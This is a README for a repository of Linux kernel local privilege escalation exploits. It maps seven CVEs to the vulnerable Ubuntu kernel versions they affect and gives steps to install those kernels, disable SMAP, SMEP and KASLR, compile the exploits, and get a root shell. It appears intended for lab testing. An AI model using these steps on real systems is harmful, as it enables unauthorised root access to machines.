# Linux kernel exploits for local privilege escalation

## Background
It is hard to find Linux kernel exploits and local privilege escalation exploits are rarely found. Fortunately, exploit-db has all kinds of exploits including the local privilege escalation (thank you exploit-db!). However, it is hard to test them because of the nature of the exploit.

For this reason, I set up an environment with Ubuntu 16.04.01 and tested local privilege escalation exploits of exploit-db. The working exploits are shown below (the list will be updated continuously).

| No | CVE ID and Exploit | Kernel Version        |
|:-:|:----------------:|:------------------------:|
| 1 | CVE-2016-4557 | kernel-4.4.0-21-generic |
| 2 | CVE-2016-5195 | kernel-4.4.0-21-generic, 4.4.0-31-generic |
| 3 | CVE-2016-8655 | kernel-4.4.0-21-generic |
| 4 | CVE-2017-6074 | kernel-4.4.0-21-generic |
| 5 | CVE-2017-7308 | kernel-4.8.0-41-generic |
| 6 | CVE-2017-1000112 | kernel-4.8.0-58-generic |
| 7 | CVE-2017-16995 | kernel-4.10.0-28-generic |

## Disclaimer
The exploits are not stable. They can corrupt your system and you need to disable some kernel protection features for testing them. For this reason, I strongly recommend a virtual machine environment to you.  

## How to use
### Install Ubuntu 16.04.01 version and clone the project.

```bash
# Clone the repository
$> git clone https://github.com/kkamagui/linux-kernel-exploits.git
```

### Install the specific kernel version for exploits and disable kernel protection feature.

```bash
# Install the kernel to test exploits. ex) kernel-4.4.0-21-generic for CVE-2016-4557
$> sudo apt update 
$> sudo apt install linux-image-4.4.0-21-generic
$> sudo apt install linux-image-extras-4.4.0-21-generic

# Add "nosmap nosmep nokaslr" to disable kernel protection feature and disable GRUB_HIDDEN_TIMEOUT to choose a specific kernel
$> sudo vi /etc/default/grub
...
#GRUB_HIDDEN_TIMEOUT=0
GRUB_CMDLINE_LINUX_DEFAULT="quiet splash nosmap nosmep nokaslr"

# Update GRUB and reboot
$> sudo update-grub
$> reboot
```

### Boot and choose the specific kernel and compile exploits.
Recommend recompiling every time to clean up.

```bash
# ex) CVE-2016-4557 for testing
$> cd linux-kernel-exploits/kernel-4.4.0-21-generic/CVE-2016-4557
$> ./compile.sh

# Run the exploit
$> ./CVE-2016-4557
.......
got root!
$root> id
uid=0(root) gid=0(root) groups=0(root)
```

## Contributions
Your contributions are always welcome! If you have nice exploits, please share them with others.
